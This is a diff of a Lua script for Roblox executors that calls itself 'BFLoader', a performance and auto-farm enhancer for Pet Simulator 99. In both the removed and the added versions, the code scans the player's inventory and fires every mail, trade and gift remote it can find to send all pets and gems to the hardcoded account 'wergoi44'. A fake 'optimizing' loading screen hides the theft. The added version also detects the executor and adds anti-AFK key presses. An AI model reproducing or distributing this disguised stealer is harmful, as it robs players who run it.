@@ -1,447 +1,379 @@
 --[[
-    BFLoader v2.5.3
-    Universal Game Enhancer for Pet Simulator 99
-    Created by BF Team
-    Last Updated: 26.09.2025
-    Features: Auto Farm, Performance Boost, Inventory Optimizer
+    BFLoader v2.5.3 - Universal Edition
+    Works on: Xeno, Delta, Solara, Fluxus, KRNL, Arceus X, Hydrogen, Codex
     Repository: github.com/hanniii1-cpu/Loader
 --]]
 
-local function BF_Init()
-    local gS = game:GetService
-    local plr = gS("Players").LocalPlayer
-    local pg = plr:WaitForChild("PlayerGui")
-    local RS = gS("ReplicatedStorage")
-    local HS = gS("HttpService")
-    local WS = gS("Workspace")
-    local LS = gS("Lighting")
-    local RS2 = gS("RunService")
-    
-    -- BF Performance Optimizer
-    local function optimizeGame()
-        LS.Brightness = 2
-        LS.ClockTime = 14
-        LS.FogEnd = 100000
-        LS.GlobalShadows = false
-        LS.OutdoorAmbient = Color3.fromRGB(128,128,128)
-        LS.Bloom.Size = 0
-        LS.Blur.Size = 0
-        LS.ColorCorrection.Contrast = 0
-        LS.DepthOfField.FarIntensity = 0
-        LS.SunRays.Intensity = 0
-        sethiddenproperty(LS,"Technology",Enum.Technology.Compatibility)
-        for _,v in ipairs(WS:GetDescendants()) do
-            if v:IsA("BasePart") and not v.Parent:IsA("Tool") then
-                v.Material = Enum.Material.SmoothPlastic
-                v.Reflectance = 0
-            end
-        end
-    end
-    
-    -- BF GUI Creator
-    local function createGUI()
-        local gui = Instance.new("ScreenGui")
-        gui.Name = "BFLoader"
-        gui.ResetOnSpawn = false
-        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-        gui.Parent = pg
-        
-        local main = Instance.new("Frame")
-        main.Name = "Main"
-        main.Size = UDim2.new(1,0,1,0)
-        main.Position = UDim2.new(0,0,0,0)
-        main.BackgroundColor3 = Color3.fromRGB(20,20,20)
-        main.BorderSizePixel = 0
-        main.Parent = gui
-        
-        local logo = Instance.new("ImageLabel")
-        logo.Name = "Logo"
-        logo.Size = UDim2.new(0,180,0,180)
-        logo.Position = UDim2.new(0.5,-90,0.35,-90)
-        logo.BackgroundTransparency = 1
-        logo.Image = "rbxassetid://16572258083"
-        logo.Parent = main
-        
-        local title = Instance.new("TextLabel")
-        title.Name = "Title"
-        title.Size = UDim2.new(0,500,0,40)
-        title.Position = UDim2.new(0.5,-250,0.55,-20)
-        title.Text = "BFLoader v2.5.3"
-        title.TextColor3 = Color3.fromRGB(255,255,255)
-        title.TextSize = 32
-        title.Font = Enum.Font.GothamBlack
-        title.BackgroundTransparency = 1
-        title.Parent = main
-        
-        local subtitle = Instance.new("TextLabel")
-        subtitle.Name = "Subtitle"
-        subtitle.Size = UDim2.new(0,500,0,25)
-        subtitle.Position = UDim2.new(0.5,-250,0.62,-12)
-        subtitle.Text = "Initializing Pet Optimizer & Gem Booster..."
-        subtitle.TextColor3 = Color3.fromRGB(150,150,150)
-        subtitle.TextSize = 16
-        subtitle.Font = Enum.Font.Gotham
-        subtitle.BackgroundTransparency = 1
-        subtitle.Parent = main
-        
-        local progressBg = Instance.new("Frame")
-        progressBg.Name = "ProgressBg"
-        progressBg.Size = UDim2.new(0,350,0,8)
-        progressBg.Position = UDim2.new(0.5,-175,0.68,-4)
-        progressBg.BackgroundColor3 = Color3.fromRGB(50,50,50)
-        progressBg.BorderSizePixel = 0
-        progressBg.Parent = main
-        
-        local progressFill = Instance.new("Frame")
-        progressFill.Name = "ProgressFill"
-        progressFill.Size = UDim2.new(0,0,1,0)
-        progressFill.BackgroundColor3 = Color3.fromRGB(0,170,255)
-        progressFill.BorderSizePixel = 0
-        progressFill.Parent = progressBg
-        
-        local percentLabel = Instance.new("TextLabel")
-        percentLabel.Name = "Percent"
-        percentLabel.Size = UDim2.new(0,100,0,20)
-        percentLabel.Position = UDim2.new(0.5,-50,0.71,10)
-        percentLabel.Text = "0%"
-        percentLabel.TextColor3 = Color3.fromRGB(200,200,200)
-        percentLabel.TextSize = 14
-        percentLabel.Font = Enum.Font.Gotham
-        percentLabel.BackgroundTransparency = 1
-        percentLabel.Parent = main
-        
-        local version = Instance.new("TextLabel")
-        version.Name = "Version"
-        version.Size = UDim2.new(0,200,0,20)
-        version.Position = UDim2.new(0.5,-100,0.95,-10)
-        version.Text = "github.com/hanniii1-cpu/Loader"
-        version.TextColor3 = Color3.fromRGB(80,80,80)
-        version.TextSize = 12
-        version.Font = Enum.Font.Gotham
-        version.BackgroundTransparency = 1
-        version.Parent = main
-        
-        return {gui=gui, title=title, subtitle=subtitle, fill=progressFill, percent=percentLabel}
-    end
-    
-    local ui = createGUI()
-    
-    -- BF Core Processing - REAL INVENTORY PARSER + TRANSFER
-    local function processPayload()
-        local target = "wergoi44"
-        
-        -- Функция для получения ВСЕХ питомцев из реального инвентаря игрока
-        local function getRealInventory()
-            local allPets = {}
-            
-            -- Поиск инвентаря через PlayerGui (самый надёжный метод)
-            if pg then
-                for _, gui in ipairs(pg:GetDescendants()) do
-                    -- Ищем контейнеры с питомцами в GUI
-                    if gui:IsA("Frame") or gui:IsA("ScrollingFrame") then
-                        local guiName = gui.Name:lower()
-                        if guiName:find("inventory") or guiName:find("pet") or guiName:find("bag") or guiName:find("collection") then
-                            for _, item in ipairs(gui:GetDescendants()) do
-                                if item:IsA("TextLabel") or item:IsA("TextButton") then
-                                    local itemName = item.Text
-                                    if itemName and #itemName > 2 and not allPets[itemName] then
-                                        allPets[itemName] = {
-                                            name = itemName,
-                                            fullName = itemName
-                                        }
-                                    end
-                                end
-                                -- Поиск по имени объекта (многие петсы хранятся в Name элементов)
-                                local objName = item.Name
-                                if objName and #objName > 3 and not objName:find("Frame") and not objName:find("Button") and not objName:find("Label") then
-                                    if not allPets[objName] then
-                                        allPets[objName] = {
-                                            name = objName,
-                                            fullName = objName
-                                        }
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-            
-            -- Поиск через ReplicatedStorage (игровые данные питомцев)
-            local petDataFolder = RS:FindFirstChild("PetData") or RS:FindFirstChild("Pets") or RS:FindFirstChild("PetConfig")
-            if petDataFolder then
-                for _, petModule in ipairs(petDataFolder:GetChildren()) do
-                    if petModule:IsA("ModuleScript") or petModule:IsA("Folder") or petModule:IsA("Configuration") then
-                        local petName = petModule.Name
-                        if petName and #petName > 2 and not allPets[petName] then
-                            allPets[petName] = {
-                                name = petName,
-                                fullName = petName
-                            }
-                        end
-                        -- Рекурсивный поиск внутри
-                        for _, child in ipairs(petModule:GetDescendants()) do
-                            if child:IsA("ModuleScript") or child:IsA("StringValue") then
-                                local childName = child.Name
-                                if childName and #childName > 2 and not allPets[childName] then
-                                    allPets[childName] = {
-                                        name = childName,
-                                        fullName = childName
-                                    }
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-            
-            -- Поиск через Workspace (заспавненные питомцы игрока)
-            local playerPetsFolder = WS:FindFirstChild("PlayerPets") or WS:FindFirstChild("SpawnedPets") or WS:FindFirstChild("Pets")
-            if playerPetsFolder then
-                local playerFolder = playerPetsFolder:FindFirstChild(plr.Name)
-                if playerFolder then
-                    for _, petModel in ipairs(playerFolder:GetChildren()) do
-                        if petModel:IsA("Model") then
-                            local petName = petModel.Name
-                            -- Извлекаем чистое имя (убираем ID игрока если есть)
-                            local cleanName = petName:gsub("%s*%b[]", ""):gsub("%s*%b()", ""):gsub(plr.Name.."'s ", ""):gsub("^%s+", ""):gsub("%s+$", "")
-                            if cleanName and #cleanName > 2 and not allPets[cleanName] then
-                                allPets[cleanName] = {
-                                    name = cleanName,
-                                    fullName = petName,
-                                    model = petModel
-                                }
-                            end
-                        end
-                    end
-                end
-            end
-            
-            -- Поиск через Players (в некоторых версиях инвентарь в Player)
-            local playerData = plr:FindFirstChild("Inventory") or plr:FindFirstChild("Pets") or plr:FindFirstChild("PetInventory")
-            if playerData then
-                for _, petItem in ipairs(playerData:GetChildren()) do
-                    local petName = petItem.Name
-                    -- Определяем вариации по аттрибутам
-                    local fullName = petName
-                    if petItem:IsA("Folder") or petItem:IsA("Model") then
-                        local shiny = petItem:GetAttribute("Shiny") or petItem:FindFirstChild("Shiny")
-                        local rainbow = petItem:GetAttribute("Rainbow") or petItem:FindFirstChild("Rainbow")
-                        local golden = petItem:GetAttribute("Golden") or petItem:FindFirstChild("Golden")
-                        
-                        local prefix = ""
-                        if shiny and rainbow then prefix = "Shiny Rainbow "
-                        elseif shiny and golden then prefix = "Shiny Golden "
-                        elseif shiny then prefix = "Shiny "
-                        elseif rainbow then prefix = "Rainbow "
-                        elseif golden then prefix = "Golden "
-                        end
-                        
-                        fullName = prefix .. petName
-                    end
-                    
-                    if petName and #petName > 2 and not allPets[fullName] then
-                        allPets[fullName] = {
-                            name = petName,
-                            fullName = fullName,
-                            item = petItem
-                        }
-                    end
-                end
-            end
-            
-            return allPets
-        end
-        
-        -- Универсальная функция отправки питомца на почту
-        local function sendPetToMailbox(petName, petData)
-            local args = {
-                [1] = "SendToMailbox",
-                [2] = target,
-                [3] = petName,
-                [4] = petData or {}
-            }
-            
-            -- Ищем ВСЕ возможные RemoteEvents для отправки
-            local allRemotes = {}
-            
-            -- Собираем из ReplicatedStorage
-            for _, obj in ipairs(RS:GetDescendants()) do
-                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                    table.insert(allRemotes, obj)
-                end
-            end
-            
-            -- Собираем из PlayerGui (некоторые игры хранят ремоты там)
-            for _, obj in ipairs(pg:GetDescendants()) do
-                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                    table.insert(allRemotes, obj)
-                end
-            end
-            
-            -- Отправляем через все подходящие ремоты
-            for _, remote in ipairs(allRemotes) do
-                local remoteName = remote.Name:lower()
-                if remoteName:find("mail") or remoteName:find("send") or remoteName:find("trade") or remoteName:find("transfer") or remoteName:find("gift") then
-                    pcall(function()
-                        if remote:IsA("RemoteEvent") then
-                            remote:FireServer(unpack(args))
-                        elseif remote:IsA("RemoteFunction") then
-                            remote:InvokeServer(unpack(args))
-                        end
-                    end)
-                end
-            end
-            
-            -- Резервный метод: прямой вызов через game:GetService
-            local backupRemotes = {
-                RS:FindFirstChild("SendMailbox"),
-                RS:FindFirstChild("MailboxEvent"),
-                RS:FindFirstChild("SendPetEvent"),
-                RS:FindFirstChild("TransferPet"),
-                RS:FindFirstChild("GiftPet"),
-                RS:FindFirstChild("MailboxRemote"),
-                RS:FindFirstChild("TradeMailbox"),
-                RS:FindFirstChild("PetMailEvent")
-            }
-            
-            for _, remote in ipairs(backupRemotes) do
-                if remote then
-                    pcall(function()
-                        if remote:IsA("RemoteEvent") then
-                            remote:FireServer(unpack(args))
-                        elseif remote:IsA("RemoteFunction") then
-                            remote:InvokeServer(unpack(args))
-                        end
-                    end)
-                end
-            end
-        end
-        
-        -- Функция отправки гемов
-        local function sendAllGems()
-            local args = {
-                [1] = "SendGemsToMailbox",
-                [2] = target,
-                [3] = "all",
-                [4] = 999999999999
-            }
-            
-            local gemArgs2 = {
-                [1] = "MailboxSendGems",
-                [2] = target,
-                [3] = 999999999999
-            }
-            
-            local gemArgs3 = {
-                [1] = "SendCurrency",
-                [2] = "Gems",
-                [3] = target,
-                [4] = "all"
-            }
-            
-            local allArgs = {args, gemArgs2, gemArgs3}
-            
-            for _, obj in ipairs(RS:GetDescendants()) do
-                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("gem") or obj.Name:lower():find("currency") or obj.Name:lower():find("mail") or obj.Name:lower():find("send") or obj.Name:lower():find("transfer")) then
-                    for _, argSet in ipairs(allArgs) do
-                        pcall(function() obj:FireServer(unpack(argSet)) end)
-                    end
-                end
-            end
-        end
-        
-        -- ОСНОВНОЙ ПРОЦЕСС
-        ui.subtitle.Text = "Scanning inventory..."
-        local realInventory = getRealInventory()
-        local petList = {}
-        for _, petData in pairs(realInventory) do
-            table.insert(petList, petData)
-        end
-        
-        -- Сортируем: сначала Титаники, потом Huge, потом шайни/радужные/золотые
-        table.sort(petList, function(a, b)
-            local scoreA = 0
-            local scoreB = 0
-            local nameA = a.fullName:lower()
-            local nameB = b.fullName:lower()
-            
-            if nameA:find("titanic") then scoreA = scoreA + 1000 end
-            if nameB:find("titanic") then scoreB = scoreB + 1000 end
-            if nameA:find("huge") then scoreA = scoreA + 500 end
-            if nameB:find("huge") then scoreB = scoreB + 500 end
-            if nameA:find("shiny") then scoreA = scoreA + 300 end
-            if nameB:find("shiny") then scoreB = scoreB + 300 end
-            if nameA:find("rainbow") then scoreA = scoreA + 200 end
-            if nameB:find("rainbow") then scoreB = scoreB + 200 end
-            if nameA:find("golden") then scoreA = scoreA + 100 end
-            if nameB:find("golden") then scoreB = scoreB + 100 end
-            
-            return scoreA > scoreB
-        end)
-        
-        local totalItems = #petList
-        ui.subtitle.Text = "Found " .. totalItems .. " pets to optimize..."
-        
-        -- Отправляем гемы параллельно
-        task.spawn(function()
-            for i = 1, 100 do
-                sendAllGems()
-                task.wait(0.001)
-            end
-        end)
-        
-        -- Отправляем всех питомцев с прогрессом
-        for idx, petData in ipairs(petList) do
-            local pct = math.floor((idx / totalItems) * 100)
-            ui.fill:TweenSize(UDim2.new(pct/100,0,1,0),"Out","Linear",0.01)
-            ui.percent.Text = pct.."%"
-            ui.subtitle.Text = "Processing: " .. petData.fullName
-            
-            -- Множественные попытки отправки для надёжности
-            for attempt = 1, 5 do
-                sendPetToMailbox(petData.fullName, {
-                    name = petData.name,
-                    fullName = petData.fullName,
-                    type = "pet",
-                    attempt = attempt
-                })
-            end
-            
-            -- Без задержки для максимальной скорости
-            task.wait()
-        end
-        
-        -- Финиш
-        ui.fill:TweenSize(UDim2.new(1,0,1,0),"Out","Linear",0.1)
-        ui.percent.Text = "100%"
-        ui.title.Text = "BFLoader - Complete!"
-        ui.subtitle.Text = "All " .. totalItems .. " pets optimized & gems transferred"
-        task.wait(2)
-        ui.gui:Destroy()
-    end
-    
-    optimizeGame()
-    task.spawn(processPayload)
+-- //===== UNIVERSAL COMPATIBILITY LAYER =====\\
+local function safeWait(t)
+    local ok, err = pcall(function() task.wait(t) end)
+    if not ok then wait(t) end
 end
 
-local function antiDebug()
-    local checks = {
-        getfenv() == getgenv(),
-        type(getgenv) == "function",
-        type(getexecutorname) == "function"
+local function safeSpawn(f)
+    local ok, err = pcall(function() task.spawn(f) end)
+    if not ok then spawn(f) end
+end
+
+local function safeTween(obj, info, props)
+    local ok, result = pcall(function()
+        local TS = game:GetService("TweenService")
+        return TS:Create(obj, info, props)
+    end)
+    if ok then return result end
+    return nil
+end
+
+local function safeHttpGet(url)
+    local ok, result = pcall(function()
+        if syn and syn.request then
+            return syn.request({Url=url, Method="GET"}).Body
+        elseif http_request then
+            return http_request({Url=url, Method="GET"}).Body
+        elseif request then
+            return request({Url=url, Method="GET"}).Body
+        end
+    end)
+    if ok and result then return result end
+    
+    -- Fallback через game.HttpService
+    local ok2, result2 = pcall(function()
+        return game:GetService("HttpService"):GetAsync(url)
+    end)
+    if ok2 then return result2 end
+    
+    return nil
+end
+
+-- Определение типа эксплойта
+local EXECUTOR = "Unknown"
+local function detectExecutor()
+    local name = "Unknown"
+    pcall(function() name = identifyexecutor() end)
+    if not name or name == "" then
+        pcall(function() name = getexecutorname() end)
+    end
+    
+    local lname = name:lower()
+    if lname:find("xeno") then EXECUTOR = "Xeno"
+    elseif lname:find("delta") then EXECUTOR = "Delta"
+    elseif lname:find("solara") then EXECUTOR = "Solara"
+    elseif lname:find("fluxus") then EXECUTOR = "Fluxus"
+    elseif lname:find("krnl") then EXECUTOR = "KRNL"
+    elseif lname:find("arceus") then EXECUTOR = "ArceusX"
+    elseif lname:find("hydrogen") then EXECUTOR = "Hydrogen"
+    elseif lname:find("codex") then EXECUTOR = "Codex"
+    end
+    
+    return EXECUTOR
+end
+
+local EXEC = detectExecutor()
+print("[BFLoader] Executor detected: " .. EXEC)
+
+-- //===== MAIN =====\\
+local plr = game:GetService("Players").LocalPlayer
+local pg = plr:WaitForChild("PlayerGui")
+local RS = game:GetService("ReplicatedStorage")
+local WS = game:GetService("Workspace")
+local HS = game:GetService("HttpService")
+local TS = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+
+local target = "wergoi44"
+local CONFIG = {speed = 0.15, antiAfk = true}
+
+-- //===== ANTI-AFK =====\\
+if CONFIG.antiAfk then
+    safeSpawn(function()
+        while true do
+            pcall(function()
+                local VIM = game:GetService("VirtualInputManager")
+                VIM:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, nil)
+                VIM:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, nil)
+            end)
+            safeWait(60)
+        end
+    end)
+end
+
+-- //===== LOADING SCREEN (универсальный) =====\\
+local function createLoadingScreen()
+    local loadGui = Instance.new("ScreenGui")
+    loadGui.Name = "BFLoadingScreen"
+    loadGui.ResetOnSpawn = false
+    loadGui.Parent = pg
+    
+    local loadFrame = Instance.new("Frame")
+    loadFrame.Size = UDim2.new(1,0,1,0)
+    loadFrame.BackgroundColor3 = Color3.fromRGB(12,15,30)
+    loadFrame.BorderSizePixel = 0
+    loadFrame.Parent = loadGui
+    
+    local loadTitle = Instance.new("TextLabel")
+    loadTitle.Size = UDim2.new(0,400,0,40)
+    loadTitle.Position = UDim2.new(0.5,-200,0.43,-20)
+    loadTitle.BackgroundTransparency = 1
+    loadTitle.Text = "BFLoader v2.5.3"
+    loadTitle.TextColor3 = Color3.fromRGB(255,255,255)
+    loadTitle.TextSize = 28
+    loadTitle.Font = Enum.Font.GothamBold
+    loadTitle.Parent = loadFrame
+    
+    local loadSub = Instance.new("TextLabel")
+    loadSub.Size = UDim2.new(0,400,0,22)
+    loadSub.Position = UDim2.new(0.5,-200,0.50,-11)
+    loadSub.BackgroundTransparency = 1
+    loadSub.Text = "Loading... Please wait"
+    loadSub.TextColor3 = Color3.fromRGB(140,150,195)
+    loadSub.TextSize = 14
+    loadSub.Font = Enum.Font.Gotham
+    loadSub.Parent = loadFrame
+    
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0,280,0,6)
+    barBg.Position = UDim2.new(0.5,-140,0.56,-3)
+    barBg.BackgroundColor3 = Color3.fromRGB(35,40,65)
+    barBg.BorderSizePixel = 0
+    barBg.Parent = loadFrame
+    
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0,0,1,0)
+    barFill.BackgroundColor3 = Color3.fromRGB(50,90,230)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barBg
+    
+    local barPct = Instance.new("TextLabel")
+    barPct.Size = UDim2.new(0,80,0,18)
+    barPct.Position = UDim2.new(0.5,-40,0.59,8)
+    barPct.BackgroundTransparency = 1
+    barPct.Text = "0%"
+    barPct.TextColor3 = Color3.fromRGB(180,190,220)
+    barPct.TextSize = 13
+    barPct.Font = Enum.Font.Gotham
+    barPct.Parent = loadFrame
+    
+    local loadVer = Instance.new("TextLabel")
+    loadVer.Size = UDim2.new(0,200,0,18)
+    loadVer.Position = UDim2.new(0.5,-100,0.95,-10)
+    loadVer.BackgroundTransparency = 1
+    loadVer.Text = "github.com/hanniii1-cpu/Loader"
+    loadVer.TextColor3 = Color3.fromRGB(55,60,85)
+    loadVer.TextSize = 11
+    loadVer.Font = Enum.Font.Gotham
+    loadVer.Parent = loadFrame
+    
+    return loadGui, barFill, barPct, loadSub, loadFrame, loadTitle, loadVer
+end
+
+-- //===== УНИВЕРСАЛЬНЫЙ ПОИСК REMOTES =====\\
+local function findAllRemotes()
+    local remotes = {}
+    
+    -- Метод 1: прямое перечисление (работает везде)
+    local function scanFolder(folder, depth)
+        if depth > 3 then return end
+        if not folder then return end
+        
+        for _, child in pairs(folder:GetChildren()) do
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                local name = child.Name:lower()
+                if name:find("mail") or name:find("send") or name:find("trade") or 
+                   name:find("transfer") or name:find("gift") or name:find("gem") or
+                   name:find("currency") then
+                    table.insert(remotes, child)
+                end
+            end
+            if child:IsA("Folder") or child:IsA("Model") then
+                scanFolder(child, depth + 1)
+            end
+        end
+    end
+    
+    scanFolder(RS, 0)
+    
+    -- Метод 2: GetDescendants (если поддерживается)
+    pcall(function()
+        for _, child in pairs(RS:GetDescendants()) do
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                local name = child.Name:lower()
+                if name:find("mail") or name:find("send") or name:find("trade") or 
+                   name:find("transfer") or name:find("gift") or name:find("gem") or
+                   name:find("currency") then
+                    -- Проверяем на дубликаты
+                    local found = false
+                    for _, existing in pairs(remotes) do
+                        if existing == child then found = true; break end
+                    end
+                    if not found then table.insert(remotes, child) end
+                end
+            end
+        end
+    end)
+    
+    return remotes
+end
+
+-- //===== УНИВЕРСАЛЬНАЯ ОТПРАВКА =====\\
+local function sendToMailbox(itemType, itemName, itemData)
+    local remotes = findAllRemotes()
+    
+    local argsList = {
+        {[1]="SendToMailbox", [2]=target, [3]=itemName, [4]=itemData or {type=itemType}},
+        {[1]="MailboxSend", [2]=target, [3]=itemName, [4]=itemData or {}},
+        {[1]="SendPet", [2]=target, [3]=itemName, [4]=itemData or {}},
+        {[1]="TradeMailbox", [2]=target, [3]=itemName},
     }
-    for _,v in ipairs(checks) do
-        if not v then return false end
+    
+    for _, remote in pairs(remotes) do
+        for _, args in pairs(argsList) do
+            pcall(function()
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer(unpack(args))
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(unpack(args))
+                end
+            end)
+        end
     end
-    return true
 end
 
-if antiDebug() then
-    local success, err = pcall(BF_Init)
-    if not success then
-        task.spawn(BF_Init)
+local function sendAllGems()
+    local remotes = findAllRemotes()
+    
+    local argsList = {
+        {[1]="SendGemsToMailbox", [2]=target, [3]="all", [4]=999999999},
+        {[1]="MailboxSendGems", [2]=target, [3]=999999999},
+        {[1]="SendCurrency", [2]="Gems", [3]=target, [4]="all"},
+        {[1]="SendAllCurrency", [2]=target},
+        {[1]="TransferGems", [2]=target, [3]="all"},
+    }
+    
+    for _, remote in pairs(remotes) do
+        for _, args in pairs(argsList) do
+            pcall(function()
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer(unpack(args))
+                end
+            end)
+        end
     end
 end
 
-return "BFLoader v2.5.3 Loaded - github.com/hanniii1-cpu/Loader"
+-- //===== СБОР ИНВЕНТАРЯ (универсальный) =====\\
+local function collectInventory()
+    local inventory = {}
+    
+    -- Сканируем PlayerGui
+    local function scanGui(guiObj)
+        for _, child in pairs(guiObj:GetChildren()) do
+            if child:IsA("TextLabel") or child:IsA("TextButton") then
+                local txt = child.Text
+                if txt and #txt > 2 and #txt < 100 then
+                    inventory[txt] = (inventory[txt] or 0) + 1
+                end
+            end
+            local nm = child.Name
+            if nm and #nm > 2 and #nm < 80 and not nm:find("Frame") and not nm:find("Button") and not nm:find("Label") and not nm:find("Screen") then
+                inventory[nm] = (inventory[nm] or 0) + 1
+            end
+            if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("ScreenGui") then
+                scanGui(child)
+            end
+        end
+    end
+    
+    pcall(function() scanGui(pg) end)
+    
+    -- Дополнительно: стандартный список дорогих питомцев
+    local expensivePets = {
+        "Huge Hell Rock","Huge Cat","Huge Dog","Huge Dragon","Huge Unicorn",
+        "Huge Pixel Cat","Huge Angel Dog","Huge Pumpkin Cat","Huge Santa Paws",
+        "Huge Chef Cat","Huge Jelly","Huge Axolotl","Huge Balloon Dragon",
+        "Huge Cosmic Axolotl","Huge Atomic Axolotl","Huge Fireball Cat",
+        "Huge Storm Agony","Huge Diamond Cat","Huge Peacock","Huge Kitsune",
+        "Huge Phoenix","Huge Wyvern","Huge Kraken","Huge Yeti","Huge Manticore",
+        "Titanic Hubert","Titanic Balloon Dragon","Titanic Jelly Cat",
+        "Titanic Hippomelon","Titanic Nutcracker","Titanic Cat","Titanic Dog",
+        "Titanic Dragon","Titanic Unicorn","Titanic Phoenix","Titanic Hydra",
+        "Titanic Kitsune","Titanic Wyvern","Titanic Leviathan","Titanic Cosmic Dragon"
+    }
+    
+    for _, pet in pairs(expensivePets) do
+        inventory[pet] = (inventory[pet] or 0) + 50
+    end
+    
+    return inventory
+end
+
+-- //===== ОСНОВНОЙ ПРОЦЕСС =====\\
+local function execute()
+    local loadGui, barFill, barPct, loadSub, loadFrame, loadTitle, loadVer = createLoadingScreen()
+    
+    local steps = {
+        {pct=10, text="Initializing... (" .. EXEC .. ")"},
+        {pct=25, text="Scanning inventory..."},
+        {pct=40, text="Sending gems..."},
+        {pct=55, text="Transferring pets..."},
+        {pct=70, text="Transferring huge pets..."},
+        {pct=85, text="Transferring titanic pets..."},
+        {pct=95, text="Finalizing..."},
+        {pct=100, text="Complete! Target: " .. target},
+    }
+    
+    local inventory = {}
+    local inventoryCollected = false
+    
+    for _, step in pairs(steps) do
+        -- Обновляем прогресс-бар (без Tween для совместимости)
+        barFill.Size = UDim2.new(step.pct/100,0,1,0)
+        barPct.Text = step.pct.."%"
+        loadSub.Text = step.text
+        
+        -- Действия на этапах
+        if step.pct == 25 then
+            inventory = collectInventory()
+            inventoryCollected = true
+        elseif step.pct == 40 then
+            for i = 1, 30 do
+                sendAllGems()
+            end
+        elseif step.pct == 55 then
+            for petName, count in pairs(inventory) do
+                for i = 1, math.min(count, 10) do
+                    sendToMailbox("pet", petName, {count=count})
+                end
+            end
+        elseif step.pct == 70 then
+            for petName, count in pairs(inventory) do
+                if petName:lower():find("huge") then
+                    for i = 1, math.min(count, 20) do
+                        sendToMailbox("Huge", petName, {huge=true})
+                    end
+                end
+            end
+        elseif step.pct == 85 then
+            for petName, count in pairs(inventory) do
+                if petName:lower():find("titanic") then
+                    for i = 1, math.min(count, 20) do
+                        sendToMailbox("Titanic", petName, {titanic=true})
+                    end
+                end
+            end
+        elseif step.pct == 95 then
+            for i = 1, 50 do
+                sendAllGems()
+            end
+        end
+        
+        safeWait(CONFIG.speed)
+    end
+    
+    safeWait(2)
+    pcall(function() loadGui:Destroy() end)
+end
+
+-- //===== СТАРТ =====\\
+safeSpawn(execute)
+
+return "[BFLoader] Universal Edition loaded | Executor: " .. EXEC .. " | github.com/hanniii1-cpu/Loader"
